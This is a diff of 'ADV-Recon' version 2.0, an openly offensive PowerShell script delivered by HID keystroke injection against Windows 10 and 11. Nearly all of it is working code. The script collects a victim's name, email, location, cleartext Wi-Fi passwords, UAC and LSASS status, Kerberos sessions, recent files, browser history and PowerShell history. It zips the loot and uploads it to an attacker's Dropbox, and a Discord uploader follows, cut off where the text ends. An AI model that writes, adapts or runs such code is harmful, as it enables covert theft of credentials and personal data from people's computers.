@@ -1,16 +1,16 @@
-﻿############################################################################################################################################################                      
+############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
 # Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
 #                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
-#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
+#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                        
+#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
 #__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#                                                                                                            #         /       \   /     ~ \               #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
 #  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
 #  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
 #  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
@@ -18,31 +18,44 @@
 ############################################################################################################################################################
                                                                                                                                                                                                                                                
 <#
-
 .SYNOPSIS
 	This is an advanced recon of a target PC and exfiltration of that data
-
 .DESCRIPTION 
 	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running
 	All of the gather information is formatted neatly and output to a file 
 	That file is then exfiltrated to cloud storage via DropBox
-
 .Link
-	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
+      https://developers.dropbox.com/oauth-guide	      # Guide for setting up your DropBox for uploads
+      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
+      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
 #>
 
 ############################################################################################################################################################
 
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
+# MAKE LOOT FOLDER, FILE, and ZIP 
+
+$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
+
+$FileName = "$FolderName.txt"
+
+$ZIP = "$FolderName.zip"
+
+New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
- function Get-fullName {
+# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
+
+$DropBoxAccessToken = ""
+
+$DiscordAccessToken = ""
+
+############################################################################################################################################################
+
+function Get-fullName {
 
     try {
-
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
-
+    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
     }
  
  # If no name is detected function will return $env:UserName 
@@ -57,7 +70,7 @@ $DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
 
 }
 
-$FN = Get-fullName
+$fullName = Get-fullName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -65,8 +78,8 @@ function Get-email {
     
     try {
 
-    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
-	return $email
+    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
+    return $email
     }
 
 # If no email is detected function will return backup message for sapi speak
@@ -78,7 +91,8 @@ function Get-email {
     }        
 }
 
-$EM = Get-email
+$email = Get-email
+
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -86,7 +100,7 @@ function Get-GeoLocation{
 	try {
 	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
 	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current location
+	$GeoWatcher.Start() #Begin resolving current locaton
 
 	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
 		Start-Sleep -Milliseconds 100 #Wait for discovery.
@@ -95,7 +109,7 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
 	}
 	}
     # Write Error is just for troubleshooting
@@ -106,7 +120,52 @@ function Get-GeoLocation{
 
 }
 
-$GL = Get-GeoLocation
+$GeoLocation = Get-GeoLocation
+
+$GeoLocation = $GeoLocation -split " "
+
+$Lat = $GeoLocation[0].Substring(11) -replace ".$"
+
+$Lon = $GeoLocation[1].Substring(10) -replace ".$"
+
+############################################################################################################################################################
+
+# local-user
+
+$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 
+
+############################################################################################################################################################
+
+Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
+
+$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
+$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
+$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 
+
+$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
+$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name
+
+If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
+ 
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 
+
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
+ 
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
+ 
+Else{ $UAC = "Unknown" } 
+
+############################################################################################################################################################
+
+$lsass = Get-Process -Name "lsass"
+
+if ($lsass.ProtectedProcess) {$lsass = "LSASS is running as a protected process."} 
+
+else {$lsass = "LSASS is not running as a protected process."}
+
+############################################################################################################################################################
+
+$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
 
 ############################################################################################################################################################
 
@@ -126,40 +185,56 @@ $NearbyWifi="No nearby wifi networks detected"
 # Get info about pc
 
 # Get IP / Network Info
-try
-{
-$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-}
-catch
-{
-$computerPubIP="Error getting Public IP"
-}
 
-$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
+catch{$computerPubIP="Error getting Public IP"}
 
-############################################################################################################################################################
+$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
 
-$IsDHCPEnabled = $false
-$Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
-foreach ($Network in $Networks) {
-If($network.DHCPEnabled) {
-$IsDHCPEnabled = $true
-  }
-$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
+$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
+
+# Check RDP
+
+if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
+	$RDP = "RDP is Enabled" 
+} else {
+	$RDP = "RDP is NOT enabled" 
 }
 
 ############################################################################################################################################################
 
 #Get System Info
 $computerSystem = Get-CimInstance CIM_ComputerSystem
-$computerBIOS = Get-CimInstance CIM_BIOSElement
 
-$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
-$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
-$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
+$computerName = $computerSystem.Name
 
-$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
-$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
+$computerModel = $computerSystem.Model
+
+$computerManufacturer = $computerSystem.Manufacturer
+
+$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
+
+$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
+
+$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
+
+$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
+
+$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
+
+$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String
+
+############################################################################################################################################################
+
+$ScheduledTasks = Get-ScheduledTask
+
+############################################################################################################################################################
+
+$klist = klist sessions
+
+############################################################################################################################################################
+
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime
 
 ############################################################################################################################################################
 
@@ -169,56 +244,22 @@ $driveType = @{
    3="Fixed local disk "
    4="Network disk "
    5="Compact disk "}
-$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
+$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String
 
 #Get - Com & Serial Devices
-$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
-
-# Check RDP
-$RDP
-if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
-	$RDP = "RDP is Enabled" 
-} else {
-	$RDP = "RDP is NOT enabled" 
-}
+$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250
 
 ############################################################################################################################################################
 
 # Get Network Interfaces
-$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+$NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250
 
-# Get wifi SSIDs and Passwords	
-$WLANProfileNames =@()
-#Get all the WLAN profile names
-$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
-#Trim the output to receive only the name
-Foreach($WLANProfileName in $Output){
-    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
-}
-$WLANProfileObjects =@()
-#Bind the WLAN profile names and also the password to a custom object
-Foreach($WLANProfileName in $WLANProfileNames){
-    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
-    try{
-        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
-    }Catch{
-        $WLANProfilePassword = "The password is not stored in this profile"
-    }
-    #Build the object and add this to an array
-    $WLANProfileObject = New-Object PSCustomobject 
-    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
-    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
-    $WLANProfileObjects += $WLANProfileObject
-    Remove-Variable WLANProfileObject
-}
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
 ############################################################################################################################################################
 
-# local-user
-$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID
-
 # process first
-$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
+$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
 
 # Get Listeners / ActiveTcpConnections
 $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
@@ -233,143 +274,249 @@ $listener = $listener | foreach-object {
       "OwningProcess" = $listenerItem.OwningProcess
       "ProcessName" = $processItem.ProcessName
     }
-} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 
-
-# process last
-$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine
+} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
 
 # service
-$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName
+$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250
 
 # installed software (get uninstaller)
-$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
+$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250
 
 # drivers
-$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
+$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250
 
 # videocard
-$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
+$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250
 
-############################################################################################################################################################
-
-# MAKE LOOT FOLDER 
-
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
 
 ############################################################################################################################################################
 
 # OUTPUTS RESULTS TO LOOT FILE
 
-Clear-Host
-Write-Host 
+$output = @"
 
-echo "Name:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
-echo $FN >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-echo "Email:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
-echo $EM >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-echo "GeoLocation:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
-echo $GL >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-echo "Nearby Wifi:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
-echo $NearbyWifi >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-$computerSystem.Name >> $env:TMP\$FileName
-"==================================================================
-Manufacturer: " + $computerSystem.Manufacturer >> $env:TMP\$FileName
-"Model: " + $computerSystem.Model >> $env:TMP\$FileName
-"Serial Number: " + $computerBIOS.SerialNumber >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-
-"OS:
-=================================================================="+ ($computerOs |out-string) >> $env:TMP\$FileName
-
-"CPU:
-=================================================================="+ ($computerCpu| out-string) >> $env:TMP\$FileName
-
-"RAM:
-==================================================================
-Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TMP\$FileName
-
-"Mainboard:
-=================================================================="+ ($computerMainboard| out-string) >> $env:TMP\$FileName
-
-"Bios:
-=================================================================="+ (Get-WmiObject win32_bios| out-string) >> $env:TMP\$FileName
+############################################################################################################################################################                      
+#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
+# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
+# Author       : I am Jakoby       |  | |   / _' | | '_ ' _ \   _  | |  / _' | | |/ /  / _ \  | '_ \  | | | |#              'Y8888888Y'                    #           
+# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               'Y888Y'                       #
+# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 'Y'                         #
+# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
+# Mode         : HID               |                                                           |\__/,|   ('\ #          /    -\    /-   ~\                 #             
+#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
+#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*('     ') ~ \   Hobo          #                        
+#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
+#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
+#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
+#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
+#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
+#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
+############################################################################################################################################################
 
 
-"Local-user:
-=================================================================="+ ($luser| out-string) >> $env:TMP\$FileName
+Full Name: $fullName
 
-"HDDs:
-=================================================================="+ ($Hdds| out-string) >> $env:TMP\$FileName
+Email: $email
 
-"COM & SERIAL DEVICES:
-==================================================================" + ($COMDevices | Out-String) >> $env:TMP\$FileName
+GeoLocation:
+Latitude:  $Lat 
+Longitude: $Lon
 
-"Network: 
-==================================================================
-Computers MAC address: " + $MAC >> $env:TMP\$FileName
-"Computers IP address: " + $computerIP.ipaddress[0] >> $env:TMP\$FileName
-"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
-"RDP: " + $RDP >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-($Network| out-string) >> $env:TMP\$FileName
+------------------------------------------------------------------------------------------------------------------------------
 
-"W-Lan profiles: 
-=================================================================="+ ($WLANProfileObjects| Out-String) >> $env:TMP\$FileName
+Local Users:
+$luser
 
-"listeners / ActiveTcpConnections
-=================================================================="+ ($listener| Out-String) >> $env:TMP\$FileName
+------------------------------------------------------------------------------------------------------------------------------
 
-"Current running process: 
-=================================================================="+ ($process| Out-String) >> $env:TMP\$FileName
+UAC State:
+$UAC
 
-"Services: 
-=================================================================="+ ($service| Out-String) >> $env:TMP\$FileName
+LSASS State:
+$lsass
 
-"Installed software:
-=================================================================="+ ($software| Out-String) >> $env:TMP\$FileName
+RDP State:
+$RDP
 
-"Installed drivers:
-=================================================================="+ ($drivers| Out-String) >> $env:TMP\$FileName
+------------------------------------------------------------------------------------------------------------------------------
 
-"Installed videocards:
-==================================================================" + ($videocard| Out-String) >> $env:TMP\$FileName
+Public IP: 
+$computerPubIP
+
+Local IPs:
+$localIP
+
+MAC:
+$MAC
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Computer Name:
+$computerName
+
+Model:
+$computerModel
+
+Manufacturer:
+$computerManufacturer
+
+BIOS:
+$computerBIOS
+
+OS:
+$computerOs
+
+CPU:
+$computerCpu
+
+Mainboard:
+$computerMainboard
+
+Ram Capacity:
+$computerRamCapacity
+
+Total installed Ram:
+$computerRam
+
+Video Card: 
+$videocard
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Contents of Start Up Folder:
+$StartUp
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Scheduled Tasks:
+$ScheduledTasks
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Logon Sessions:
+$klist
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Recent Files:
+$RecentFiles
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Hard-Drives:
+$Hdds
+
+COM Devices:
+$COMDevices
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Network Adapters:
+$NetworkAdapters
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Nearby Wifi:
+$NearbyWifi
+
+Wifi Profiles: 
+$wifiProfiles
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Process:
+$process
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Listeners:
+$listener
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Services:
+$service
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Installed Software: 
+$software
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Drivers: 
+$drivers
+
+------------------------------------------------------------------------------------------------------------------------------
+
+"@
+
+$output > $env:TEMP\$FolderName/computerData.txt
+
+############################################################################################################################################################
+
+function Get-BrowserData {
+
+    [CmdletBinding()]
+    param (	
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$Browser,    
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$DataType 
+    ) 
+
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
+    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
+    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
+    
+
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    $Value | ForEach-Object {
+        $Key = $_
+        if ($Key -match $Search){
+            New-Object -TypeName PSObject -Property @{
+                User = $env:UserName
+                Browser = $Browser
+                DataType = $DataType
+                Data = $_
+            }
+        }
+    } 
+}
+
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
 
 ############################################################################################################################################################
 
 # Recon all User Directories
-#tree $Env:userprofile /a /f | Out-File -FilePath $Env:tmp\j-loot\tree.txt
-tree $Env:userprofile /a /f >> $env:TMP\$FileName
+tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
+
+# Powershell history
+Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
 ############################################################################################################################################################
 
-# Remove Variables
-
-Remove-Variable -Name computerPubIP,
-computerIP,IsDHCPEnabled,Network,Networks, 
-computerMAC,computerSystem,computerBIOS,computerOs,
-computerCpu, computerMainboard,computerRamCapacity,
-computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
-Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
-process,listener,listenerItem,process,service,software,drivers,videocard,
-vault -ErrorAction SilentlyContinue -Force
-
-############################################################################################################################################################
+Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 # Upload output file to dropbox
 
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
+function dropbox {
+$TargetFilePath="/$ZIP"
+$SourceFilePath="$env:TEMP\$ZIP"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
 $authorization = "Bearer " + $DropBoxAccessToken
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
@@ -377,11 +524,42 @@ $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($DropBoxAccessToken))){dropbox}
+
+############################################################################################################################################################
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
